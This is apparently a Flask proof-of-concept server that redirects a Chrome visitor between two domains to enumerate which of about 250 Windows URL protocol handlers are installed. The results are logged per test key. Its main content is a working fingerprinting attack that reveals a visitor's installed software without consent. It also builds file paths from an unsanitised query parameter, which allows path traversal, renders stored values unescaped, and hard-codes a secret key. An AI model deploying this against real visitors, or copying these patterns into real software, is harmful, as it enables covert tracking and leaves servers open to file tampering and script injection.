from flask import Flask, redirect, request, session, render_template, escape
import uuid
import json
import os
import requests

app = Flask(__name__, template_folder="./")

app.secret_key = "SuperSecret"

app.shared_data = {}

HOST1 = "domain1.com"
HOST2 = "domain2.com"



HANDLER_ENUM_LIST = ['git-client', 'mapi', 'vmware-rvm', 'OneNoteDesktop', 'outlookaccounts', 'xbox-profile', 'xbox-captures', 'FirefoxURL-308046B0AF4A39CB', 'armodelviewing', 'tortoisegit.git.protocol', 'ms-msdt', 'windows.tbauth', 'microsoftmusic', 'ms-settings-airplanemode', 'Outlook.URL.mailto.15', 'ms-edu-secureassessment', 'OneNoteDesktop.URL.16', 'xbox-gamehub', 'vms', 'ms-settings-mobilehotspot', 'ms-gamebar', 'spotify', 'ms-screensketch', 'ms-retaildemo-launchbioenrollment', 'IE.HTTP', 'bingfinance', 'ms-virtualtouchpad', 'skypecast15', 'ma-chan', 'vstfs', 'Explorer.EraseDisc', 'xbox-network', 'MMS', 'Explorer.AssocActionId.BurnSelection', 'ms-settings-notifications', 'microsoft.windows.photos.picker', 'Explorer.AssocActionId.ZipSelection', 'citrixonline533', 'ms-settings-displays-topology', 'ms-search', 'file', 'xbox-arena', 'bingweather', 'read', 'ms-paint', 'ms-get-started', 'ms-word', 'ms-gamingoverlay', 'ms-ipmessaging', 'ms-sttoverlay', 'xbox-store', 'ms-settings-bluetooth', 'xbox-tcui', 'microsoft.windows.camera', 'ms-settings-location', 'wbx', 'fb467854729958013', 'com.microsoft.3dviewer', 'gotomeeting18068', 'ms-windows-search', 'ms-default-location', 'Explorer.BurnSelection', 'ms-officecmd', 'onenote-cmd', 'steam', 'tel', 'ms-windows-store', 'outlookcal', 'ms-penworkspace', 'MaxxAudioControl', 'ms-actioncenter', 'ms-apprep', 'mk', 'sips', 'mapi16', 'xbox', 'vsweb', 'ms-wpdrmv', 'ms-mobileplans', 'grvopen', 'ftp', 'tbauth', 'xboxgames', 'ms-device-enrollment', 'ms-perception-simulation', 'OneNote.URL.16', 'feedback-hub', 'sms', 'ms-settings-workplace', 'xboxmusic', 'forticlient', 'ms-contact-support', 'ms-access', 'Lync15classic', 'com.dolby.dolbyaccess.headphones', 'com.dolby.dolbyaccess.beta', 'com.microsoft.print3d', 'ms-projection', 'citrixonline', 'ms-settings-lock', 'ms-powerpoint', 'callto', 'fb347882848562911', 'ms-voip-video', 'wunderlist-import', 'gotomeeting', 'ms-msime-imjpdct', 'ms-aad-brokerplugin', 'oms', 'outlookmail', 'tn3270', 'onenote', 'ms-inputapp', 'zune', 'feeds', 'bingmaps', 'ms-xbet-survey', 'ms-walk-to', 'rlogin', 'ms-mmsys', 'tortoisegit.tgit.protocol', 'ms-getoffice', 'ms-wpc', 'microsoftvideo', 'microsoft-edge', 'ms-clock', 'mswindowsvideo', 'TortoiseGitURL.git', 'Explorer.ZipSelection', 'ms-msime-imepad', 'ms-cxh-full', 'feed', 'ms-eyecontrolspeech', 'search', 'ms-officeapp', 'ms-settings-screenrotation', 'ms-settings-language', 'ms-sway', 'ms-settings-proximity', 'OneNote', 'msnmoney', 'microsoft.windows.photos.search', 'ms-drive-to', 'vmrc', 'mailto', 'git', 'xbls', 'microsoft.windows.photos.videoedit', 'insiderhub', 'odopen', 'stssync', 'ms-screenclip', 'ms-taskswitcher', 'ms-people', 'candycrushsaga', 'ms-xbl-3d8b930f', 'ms-settings-cellular', 'https', 'tgit', 'wunderlist', 'ms-holographicfirstrun', 'ZoomPbx.im', 'msnweather', 'Explorer.AssocProtocol.search-ms', 'msnfinance', 'x-github-client', 'gotoopener', 'microsoft.windows.camera.picker', 'windowsdefender', 'iehistory', 'xboxliveapp-1297287741', 'telnet', 'ms-availablenetworks', 'ms-phone', 'Explorer.AssocActionId.EraseDisc', 'ms-settings-connectabledevices', 'tfs', 'ms-settings', 'slack', 'ms-chat', 'windows-feedback', 'ms-retaildemo-launchstart', 'DLNA-PLAYSINGLE', 'xbox-settings', 'Outlook.URL.webcal.15', 'ms-settings-wifi', 'xbox-lfg', 'ms-cortana-ainotebook', 'LDAP', 'ms-settings-privacy', 'ms-insights', 'ms-excel', 'ms-publisher', 'conf', 'ms-photos', 'Microsoft.Workfolders', 'calculator', 'skype', 'ierss', 'vm', 'smartgit', 'im', 'ms-cxh', 'microsoft.windows.camera.multipicker', 'msteams', 'ms-cortana', 'fb210831918949520', 'ms-rdx-document', 'OneIndex16', 'Outlook.URL.stssync.15', 'microsoft-edge-holographic', 'ms-gamebarservices', 'webcals', 'github-windows', 'ms-wcrv', 'Outlook.URL.feed.15', 'ms-voip-call', 'Lync15', 'mswindowsmusic', 'ms-unistore-email', 'microsoft.windows.photos.crop', 'gotomeeting17956', 'xbox-friendfinder', 'gotoopener533', 'ms-oobenetwork', 'zoommtg', 'ms-playto-miracast', 'http', 'ms-appinstaller', 'WindowsDefender', 'TortoiseGitURL', 'ms-settings-power', 'sip', 'ms-calculator', 'skypewin', 'WMP11.AssocProtocol.MMS', 'wpa', 'webcal', 'ms-xgpueject', 'wbxappwin', 'Discord', 'ms-quick-assist', 'ms-windows-store2', 'search-ms', 'res', 'WMP11.AssocProtocol.DLNA-PLAYSINGLE', 'ms-settings-emailandaccounts', 'dl-dolbyaccess', 'ma-filelink', 'bingmoney']




class KeyValueFileStorage(object):
    def __init__(self, file_path):
        if not os.path.exists(file_path):
            with open(file_path, 'w'):
                pass

        self.file_path = file_path

    def read(self):
        kv = {}
        with open(self.file_path, 'r') as f:
            for line in f.readlines():
                key, value = line.split(':')
                kv[key] = value[:-1]

        return kv

    def write(self, k, v):
        with open(self.file_path, 'a') as f:
            f.write("%s: %s\n" % (k,v ))


@app.route('/domain-accessability-test')
def domain_access():
    return 'pong'


@app.route('/')
def main():
    ua = request.headers.get("User-Agent")
    try:

        if HOST1 == HOST2:
            raise Exception("HOST1 must be a different host than HOST2.")

        responses = {
            HOST1 : requests.get('http://%s/domain-accessability-test' % HOST1).content,
            HOST2 : requests.get('http://%s/domain-accessability-test' % HOST2).content
        }


        for host, response in responses.items():
            if not response == b'pong':
                raise Exception("Tried contacting %s but the server answered with unexpected values. expected: 'pong' got: %s. "  % (host, escape(response)))   

             
    except Exception as e:
        return """<html><body><pre>
            In order to make this PoC function correctly one need to set two distinct domains to point to this HTTP server
            either by using the hosts file or an actual DNS server.

            I tried using the following domains
            HOST1 = %s
            HOST2 = %s

            And got the following exceptions:
            %s
            </pre></body></html>


        """ % (HOST1, HOST2, e)



    

    if "Chrome" in ua:
        return redirect('/chrome/router')



@app.route('/chrome/router')
def chrome_router():

    test_key = request.args.get('test_key', uuid.uuid4())
    kv = KeyValueFileStorage("tmp/%s" % test_key)

    handler_test_results = kv.read()

    for handler in HANDLER_ENUM_LIST:
        if handler not in handler_test_results.keys():
            return render_template("js_redir.html", redir_url="http://%s/chrome/handler_test?h=%s&test_key=%s" % (HOST2, handler, test_key))
    return redirect('/results?test_key=%s' % test_key)


@app.route('/chrome/handler_test')
def chrome_handler_test():
    return render_template('chrome.html', handler=request.args.get("h"), test_key=request.args.get("test_key"), host=HOST1)


@app.route('/record')
def record_results():
    kv = KeyValueFileStorage("tmp/%s" % request.args.get('test_key'))
    kv.write(request.args.get('handler'), request.args.get('is_exists'))

    return ""
    
@app.route('/results')
def show_results():
    kv = KeyValueFileStorage("tmp/%s" % request.args.get('test_key'))
    handler_test_results = kv.read()
    results = "\n".join(["%s: %s" % (key, value) for key, value in handler_test_results.items()])
    page = "<html><body><pre>%s</pre></body></html>" % results
    return page



if __name__ == '__main__':
    # creating tmp file if not exists
    os.makedirs('tmp', exist_ok=True)
    app.run(host="0.0.0.0", port=80)